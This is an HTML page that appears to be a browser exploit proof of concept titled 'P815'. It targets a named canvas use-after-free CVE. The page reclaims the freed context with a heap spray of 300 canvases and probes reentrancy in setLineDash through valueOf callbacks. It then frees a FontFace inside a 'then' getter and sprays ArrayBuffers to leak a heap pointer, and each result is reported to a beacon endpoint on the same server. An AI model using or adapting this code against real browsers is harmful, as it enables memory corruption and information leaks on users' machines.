<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P815</title>
<style>
body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
</style>
</head><body>
<pre id="o">P815 — Reentrant IDL Sequence Conversion Invariant Probes</pre>
<script>
'use strict';
var O=document.getElementById('o');
function log(s){O.textContent+='\n'+s;}
function bn(t,d){
  try{
    var x=new XMLHttpRequest();
    x.open('GET','/beacon.php?tag=P815-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
    x.send();
  }catch(e){}
}
function h16(v){return('0000000000000000'+BigInt(v||0).toString(16)).slice(-16);}

bn('BOOT','v1');
log('Starting P815...');

/* ========== PHASE 1: Canvas UAF Reclaim (CVE-2026-43720) ========== */
var innerCtx=null;
var canvas=document.createElement('canvas');
canvas.width=1;canvas.height=1;

var opts={};
Object.defineProperty(opts,'alpha',{
  get:function(){
    innerCtx=canvas.getContext('2d');
    return true;
  }
});
canvas.getContext('bitmaprenderer',opts);

if(!innerCtx){
  bn('FAIL','no_innerCtx');
  log('FAIL: innerCtx not created');
}else{
  bn('UAF-OK','innerCtx_created');
  log('UAF triggered');
}

/* Same-type spray */
var SPRAY=300;
var sprayCanvases=[];
var sprayCtxs=[];
var MARKER=7777.77;

for(var i=0;i<SPRAY;i++){
  var c=document.createElement('canvas');
  c.width=1;c.height=1;
  var ctx=c.getContext('2d');
  ctx.lineWidth=MARKER;
  sprayCanvases.push(c);
  sprayCtxs.push(ctx);
}

var readLW;
try{readLW=innerCtx.lineWidth;}catch(e){readLW=-1;}

var aliasIdx=-1;
if(readLW===MARKER){
  innerCtx.lineWidth=9999.99;
  for(var i=0;i<SPRAY;i++){
    if(sprayCtxs[i].lineWidth===9999.99){
      aliasIdx=i;
      break;
    }
  }
  bn('ALIAS','idx='+aliasIdx);
  log('Aliased pair confirmed at index '+aliasIdx);
}else{
  bn('RECLAIM-MISS','lw='+readLW);
  log('Reclaim missed, reloading...');
  setTimeout(function(){location.reload();},300);
}

if(aliasIdx>=0){
  var stale=innerCtx;
  var live=sprayCtxs[aliasIdx];
  var liveCanvas=sprayCanvases[aliasIdx];

  /* ========== PHASE 2: Save() Mid-Conversion Reentrancy ========== */
  var saveFired=false;
  var itemSave={
    valueOf:function(){
      saveFired=true;
      try{
        live.save();
        live.lineWidth=4444.44;
      }catch(e){}
      return 20.0;
    }
  };

  try{
    live.setLineDash([10.0, itemSave, 30.0, 40.0]);
    var dAfterSave=stale.getLineDash();
    var lwAfterSave=stale.lineWidth;
    bn('REENTRY-SAVE','saveFired='+saveFired+'|dLen='+dAfterSave.length+'|lw='+lwAfterSave+'|d1='+dAfterSave[1]);
    log('Save Reentrancy: saveFired='+saveFired+' dLen='+dAfterSave.length+' lw='+lwAfterSave);
  }catch(e){
    bn('REENTRY-SAVE-ERR',e.message);
  }

  /* ========== PHASE 3: Recursive setLineDash() Reentrancy ========== */
  var recurseFired=false;
  var itemRecurse={
    valueOf:function(){
      recurseFired=true;
      try{
        /* Nested call: assign a 2-element dash while outer is in the middle of converting 4 elements */
        live.setLineDash([111.1, 222.2]);
      }catch(e){}
      return 50.0;
    }
  };

  try{
    live.setLineDash([25.0, itemRecurse, 75.0, 100.0]);
    var dAfterRecurse=stale.getLineDash();
    bn('REENTRY-RECURSE','fired='+recurseFired+'|len='+dAfterRecurse.length+'|vals='+dAfterRecurse.join(','));
    log('Recurse Reentrancy: fired='+recurseFired+' len='+dAfterRecurse.length+' vals='+dAfterRecurse.join(','));
  }catch(e){
    bn('REENTRY-RECURSE-ERR',e.message);
  }

  /* ========== PHASE 4: Cross-Handle Mutation Mid-Conversion ========== */
  var crossFired=false;
  var itemCross={
    valueOf:function(){
      crossFired=true;
      try{
        stale.lineWidth=8888.88;
        stale.setLineDash([333.3, 444.4]);
      }catch(e){}
      return 60.0;
    }
  };

  try{
    live.setLineDash([15.0, itemCross, 45.0, 75.0]);
    var dCross=live.getLineDash();
    var lwCross=live.lineWidth;
    bn('REENTRY-CROSS','fired='+crossFired+'|len='+dCross.length+'|lw='+lwCross+'|vals='+dCross.join(','));
    log('Cross Mutation: fired='+crossFired+' len='+dCross.length+' lw='+lwCross);
  }catch(e){
    bn('REENTRY-CROSS-ERR',e.message);
  }

  /* ========== PHASE 5: Canvas Surface Dimension Mutation Mid-Conversion ========== */
  var resizeFired=false;
  var itemResize={
    valueOf:function(){
      resizeFired=true;
      try{
        /* Modifying canvas dimension resets context state per HTML5 canvas spec */
        liveCanvas.width=2;
      }catch(e){}
      return 70.0;
    }
  };

  try{
    live.setLineDash([35.0, itemResize, 105.0, 140.0]);
    var dResize=stale.getLineDash();
    var lwResize=stale.lineWidth;
    bn('REENTRY-RESIZE','fired='+resizeFired+'|len='+dResize.length+'|lw='+lwResize+'|vals='+dResize.join(','));
    log('Resize Mid-Conversion: fired='+resizeFired+' len='+dResize.length+' lw='+lwResize);
  }catch(e){
    bn('REENTRY-RESIZE-ERR',e.message);
  }

  /* ========== PHASE 6: Font Heap Anchor ========== */
  try{
    var st=document.createElement('style');
    st.textContent="@font-face{font-family:p815b;src:local(Arial);unicode-range:U+0042;}";
    document.head.appendChild(st);
    var ff=new FontFace('p815f',"local('Helvetica')",{unicodeRange:'U+0041'});
    document.fonts.add(ff);
    void ff.loaded;

    var ffAbs=[],ffFired=false;
    Object.defineProperty(FontFace.prototype,'then',{
      configurable:true,
      get:function(){
        if(ffFired)return undefined;
        ffFired=true;
        if(st){st.remove();st.textContent='';}
        try{document.fonts.delete(this);}catch(e){}
        document.body.offsetHeight;
        ffAbs=[];
        for(var a=0;a<64;a++)ffAbs.push(new ArrayBuffer(192));
        try{document.fonts.check('1em p815b');}catch(e){}
        document.body.offsetHeight;
        return undefined;
      },set:function(){}
    });
    document.fonts.load('1em p815f, p815b','AB');

    setTimeout(function(){
      delete FontFace.prototype.then;
      var leak='none';
      for(var a=0;a<ffAbs.length;a++){
        var bu=new BigUint64Array(ffAbs[a]);
        if(bu.length>=14 && bu[11]>0x1000000000n){
          leak='0x'+h16(bu[11]);
          break;
        }
      }
      bn('FONT-LEAK',leak);
      log('Font Heap Reference: '+leak);
      bn('DONE','complete|aliasIdx='+aliasIdx);
      log('P815 complete.');
    },200);
  }catch(err){
    bn('FONT-ERR',err.message);
    bn('DONE','complete_with_font_err');
  }
}
</script>
</body></html>
